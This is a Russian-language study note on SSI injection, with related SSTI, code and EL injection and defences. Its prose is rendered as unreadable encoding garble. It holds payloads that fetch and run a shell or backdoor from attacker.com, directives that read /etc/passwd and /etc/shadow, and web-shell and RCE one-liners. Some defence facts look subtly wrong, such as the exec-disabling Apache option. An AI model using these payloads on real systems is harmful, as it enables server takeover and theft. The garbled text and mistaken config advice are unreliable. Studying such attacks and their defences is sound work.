## **–ß—Ç–æ —Ç–∞–∫–æ–µ Server-Side Includes (SSI)?**

SSI ‚Äî —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ–π scripting —è–∑—ã–∫, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ –¥–æ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã –∫–ª–∏–µ–Ω—Ç—É. –û–±—ã—á–Ω–æ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –æ–±—â–µ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ (—Ö–µ–¥–µ—Ä—ã, —Ñ—É—Ç–µ—Ä—ã) –∏–ª–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ—Å—Ç—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π.

**–£—Å–ª–æ–≤–∏–µ –¥–ª—è –∞—Ç–∞–∫–∏:**¬†–í–µ–±-—Å–µ—Ä–≤–µ—Ä –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å–∫–æ–Ω—Ñ–∏–≥—É—Ä–∏—Ä–æ–≤–∞–Ω –¥–ª—è –æ–±—Ä–∞–±–æ—Ç–∫–∏ SSI (–æ–±—ã—á–Ω–æ —Ñ–∞–π–ª—ã —Å —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è–º–∏¬†`.shtml`,¬†`.shtm`).

---

## **–ö–∞—Ç–µ–≥–æ—Ä–∏–∏ SSI –∞—Ç–∞–∫**

---

### **1. Remote Code Execution (RCE)**

–ù–∞–∏–±–æ–ª–µ–µ –æ–ø–∞—Å–Ω–∞—è –∫–∞—Ç–µ–≥–æ—Ä–∏—è ‚Äî –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.

**–î–∏—Ä–µ–∫—Ç–∏–≤—ã:**
- `<!--#exec cmd="–∫–æ–º–∞–Ω–¥–∞" -->`¬†‚Äî –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –∫–æ–º–∞–Ω–¥
- `<!--#exec cgi="—Å–∫—Ä–∏–ø—Ç" -->`¬†‚Äî –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ CGI-—Å–∫—Ä–∏–ø—Ç–æ–≤

**–ü—Ä–∏–º–µ—Ä:**
``` html
<!-- –ó–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –≤–Ω–µ–¥—Ä—è–µ—Ç –≤ –ø–æ–ª–µ –∫–æ–º–º–µ–Ω—Ç–∞—Ä–∏—è –∏–ª–∏ —Ñ–æ—Ä–º—ã -->
<!--#exec cmd="ls -la /etc/" -->
<!--#exec cmd="wget http://attacker.com/shell.txt -O /var/www/shell.php" -->
```

### **2. File Disclosure / –ß—Ç–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤**

–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ —Ñ–∞–π–ª–æ–≤ –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ.

**–î–∏—Ä–µ–∫—Ç–∏–≤—ã:**

- `<!--#include file="–ø—É—Ç—å" -->`¬†‚Äî –≤–∫–ª—é—á–µ–Ω–∏–µ –ª–æ–∫–∞–ª—å–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤
- `<!--#include virtual="–ø—É—Ç—å" -->`¬†‚Äî –≤–∫–ª—é—á–µ–Ω–∏–µ —á–µ—Ä–µ–∑ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—ã–π –ø—É—Ç—å

**–ü—Ä–∏–º–µ—Ä:**
```html
<!-- –ß—Ç–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ -->
<!--#include file="/etc/passwd" -->
<!--#include virtual="/etc/shadow" -->
<!--#include file="/var/www/config/database.php" -->
```

### **3. Information Disclosure / –†–∞—Å–∫—Ä—ã—Ç–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏**

–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ –∏ —Å–µ—Ä–≤–µ—Ä–µ.

**–î–∏—Ä–µ–∫—Ç–∏–≤—ã:**

- `<!--#echo var="DOCUMENT_NAME" -->`¬†‚Äî –∏–º—è –¥–æ–∫—É–º–µ–Ω—Ç–∞
- `<!--#echo var="DATE_LOCAL" -->`¬†‚Äî –ª–æ–∫–∞–ª—å–Ω–∞—è –¥–∞—Ç–∞
- `<!--#echo var="REMOTE_ADDR" -->`¬†‚Äî IP –∫–ª–∏–µ–Ω—Ç–∞
- `<!--#echo var="DOCUMENT_URI" -->`¬†‚Äî URI –¥–æ–∫—É–º–µ–Ω—Ç–∞

**–ü—Ä–∏–º–µ—Ä:**
```html
<!-- –°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–µ—Ä–≤–µ—Ä–µ -->
Server: <!--#echo var="SERVER_SOFTWARE" -->
Path: <!--#echo var="DOCUMENT_ROOT" -->
User: <!--#echo var="REMOTE_USER" -->
```

### **4. File Manipulation / –ú–∞–Ω–∏–ø—É–ª—è—Ü–∏–∏ —Å —Ñ–∞–π–ª–∞–º–∏**

–ò–∑–º–µ–Ω–µ–Ω–∏–µ –∞—Ç—Ä–∏–±—É—Ç–æ–≤ —Ñ–∞–π–ª–æ–≤ (–µ—Å–ª–∏ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ).

**–î–∏—Ä–µ–∫—Ç–∏–≤–∞:**

- `<!--#fsize file="–ø—É—Ç—å" -->`¬†‚Äî –ø–æ–ª—É—á–µ–Ω–∏–µ —Ä–∞–∑–º–µ—Ä–∞ —Ñ–∞–π–ª–∞
- `<!--#flastmod file="–ø—É—Ç—å" -->`¬†‚Äî –¥–∞—Ç–∞ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏–∏

## **–ò–º–ø–∞–∫—Ç (–ü–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è)**

- **üü• –ü–æ–ª–Ω—ã–π –∫–æ–º–ø—Ä–æ–º–∏—Å—Å —Å–µ—Ä–≤–µ—Ä–∞**¬†—á–µ—Ä–µ–∑ RCE
- **üü• –£—Ç–µ—á–∫–∞ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö**¬†(–∫–æ–Ω—Ñ–∏–≥–∏, –ø–∞—Ä–æ–ª–∏, –∫–ª—é—á–∏)
- **üüß –†–∞—Å–∫—Ä—ã—Ç–∏–µ —Å—Ç—Ä—É–∫—Ç—É—Ä—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è**¬†–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
- **üü® Denial of Service**¬†—á–µ—Ä–µ–∑ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Ä–µ—Å—É—Ä—Å–æ–µ–º–∫–∏—Ö –∫–æ–º–∞–Ω–¥
- **üü® –î–µ—Ñ–µ–π—Å —Å–∞–π—Ç–∞**¬†—á–µ—Ä–µ–∑ –º–æ–¥–∏—Ñ–∏–∫–∞—Ü–∏—é –∫–æ–Ω—Ç–µ–Ω—Ç–∞

---

## **–ó–∞—â–∏—Ç–∞**

### **1. –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞**

```apache
# Apache - –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ SSI
Options -Includes
# –∏–ª–∏ –±–æ–ª–µ–µ –¥–µ—Ç–∞–ª—å–Ω–æ
Options -IncludesNOEXEC  # –∑–∞–ø—Ä–µ—Ç exec
Options -IncludesNoExec  # –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –≤–µ—Ä—Å–∏—è—Ö

# Nginx - –æ–±—ã—á–Ω–æ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç SSI –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
```

### **2. –í–∞–ª–∏–¥–∞—Ü–∏—è –∏ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –≤—Ö–æ–¥–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö**

```php
// –§–∏–ª—å—Ç—Ä–∞—Ü–∏—è SSI-–¥–∏—Ä–µ–∫—Ç–∏–≤
function sanitizeSSI($input) {
    $patterns = [
        '/<!--#\s*include\s+.*-->/i',
        '/<!--#\s*exec\s+.*-->/i',
        '/<!--#\s*echo\s+.*-->/i',
        '/<!--#\s*fsize\s+.*-->/i',
        '/<!--#\s*flastmod\s+.*-->/i'
    ];
    return preg_replace($patterns, '[SSI BLOCKED]', $input);
}
```

### **3. Content Security Policy**

```html
<meta http-equiv="Content-Security-Policy" content="script-src 'self'; object-src 'none'">
```

### **4. –ü—Ä–∏–Ω—Ü–∏–ø –º–∏–Ω–∏–º–∞–ª—å–Ω—ã—Ö –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π**

- –ó–∞–ø—É—Å–∫ –≤–µ–±-—Å–µ—Ä–≤–µ—Ä–∞ –ø–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–º —Å –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω—ã–º–∏ –ø—Ä–∞–≤–∞–º–∏
- –ó–∞–ø—Ä–µ—Ç –Ω–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –∫–æ–º–∞–Ω–¥ –∏–∑ –≤–µ–±-–∫–æ–Ω—Ç–µ–∫—Å—Ç–∞

### **5. –†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç**

- –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ —É—è–∑–≤–∏–º–æ—Å—Ç–∏ SSI injection
- –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ª–æ–≥–æ–≤ –Ω–∞ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–µ –ø–∞—Ç—Ç–µ—Ä–Ω—ã

---

## **–ü–æ—Ö–æ–∂–∏–µ –∞—Ç–∞–∫–∏**

---

### **1. Server-Side Template Injection (SSTI)**

[SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)

–ë–æ–ª–µ–µ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã–π –∞–Ω–∞–ª–æ–≥, –∑–∞—Ç—Ä–∞–≥–∏–≤–∞—é—â–∏–π —à–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä—ã:

- **Jinja2**¬†(Python):¬†`{{ 7*7 }}`¬†‚Üí¬†`49`
- **Twig**¬†(PHP):¬†`{{ _self.env.registerUndefinedFilterCallback("exec") }}`
- **Freemarker**¬†(Java):¬†`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`

![[SSTI.png]]

### **2. Code Injection**

–ü—Ä—è–º–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –∫–æ–¥–∞:

- **PHP**:¬†`<?php system($_GET['cmd']); ?>`
- **ASP**:¬†`<% Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe").StdOut.ReadAll()) %>`
    

### **3. Expression Language Injection (EL Injection)**

–í Java-–ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è—Ö:
- `${pageContext.request.getParameter("param")}`
- `${''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('calc')}`

## **–ö–ª—é—á–µ–≤—ã–µ —Ä–∞–∑–ª–∏—á–∏—è**

|–ê—Ç–∞–∫–∞|–ö–æ–Ω—Ç–µ–∫—Å—Ç|–£—Å–ª–æ–≤–∏—è|–ì–∏–±–∫–æ—Å—Ç—å|
|---|---|---|---|
|**SSI Injection**|–í–µ–±-—Å–µ—Ä–≤–µ—Ä (Apache)|–í–∫–ª—é—á–µ–Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∞ SSI|–û–≥—Ä–∞–Ω–∏—á–µ–Ω–∞ –¥–∏—Ä–µ–∫—Ç–∏–≤–º–∏ SSI|
|**SSTI**|–®–∞–±–ª–æ–Ω–∏–∑–∞—Ç–æ—Ä—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è|–ö–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –¥–∞–Ω–Ω—ã–º–∏ –≤ —à–∞–±–ª–æ–Ω–µ|–û—á–µ–Ω—å –≤—ã—Å–æ–∫–∞—è (–ø–æ–ª–Ω—ã–π —è–∑—ã–∫)|
|**Code Injection**|–ò–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä—ã —è–∑—ã–∫–∞|–ù–µ–≤–∞–ª–∏–¥–∏—Ä—É–µ–º—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –≤–≤–æ–¥|–ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è (–ø—Ä—è–º–æ–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ)|

## **–ü—Ä–∞–∫—Ç–∏—á–µ—Å–∫–∏–π –ø—Ä–∏–º–µ—Ä —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏**

**–£—è–∑–≤–∏–º–∞—è —Ñ–æ—Ä–º–∞:**
```html
<!-- page.shtml -->
<html>
<body>
<h1>Welcome <!--#echo var="REMOTE_USER" --></h1>
<!-- –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç –∏–∑ –ë–î -->
<div class="content">
    ${user_content}  <!-- —É—è–∑–≤–∏–º–æ–µ –º–µ—Å—Ç–æ! -->
</div>
</body>
</html>
```

**–ê—Ç–∞–∫–∞:**
```html
–ó–¥—Ä–∞–≤—Å—Ç–≤—É–π—Ç–µ! –û—Ç–ª–∏—á–Ω—ã–π —Å–∞–π—Ç.
<!--#exec cmd="wget http://attacker.com/backdoor.sh -O /tmp/bd.sh" -->
<!--#exec cmd="chmod +x /tmp/bd.sh && /tmp/bd.sh" -->
<!--#include file="/etc/passwd" -->
```

**–ó–∞—â–∏—â–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è:**
```html
<div class="content">
    ${escapeHtml(user_content)}  <!-- —ç–∫—Ä–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ HTML-—Å—É—â–Ω–æ—Å—Ç–µ–π -->
</div>
```

SSI-–∞—Ç–∞–∫–∏ –æ—Å–æ–±–µ–Ω–Ω–æ –æ–ø–∞—Å–Ω—ã –≤ —Å–∏—Å—Ç–µ–º–∞—Ö, –≥–¥–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–∏–π –∫–æ–Ω—Ç–µ–Ω—Ç –æ—Ç–æ–±—Ä–∞–∂–∞–µ—Ç—Å—è –±–µ–∑ –¥–æ–ª–∂–Ω–æ–π —Å–∞–Ω–∏—Ç–∏–∑–∞—Ü–∏–∏, –∞ —Å–µ—Ä–≤–µ—Ä –Ω–∞—Å—Ç—Ä–æ–µ–Ω –Ω–∞ –æ–±—Ä–∞–±–æ—Ç–∫—É SSI-–¥–∏—Ä–µ–∫—Ç–∏–≤.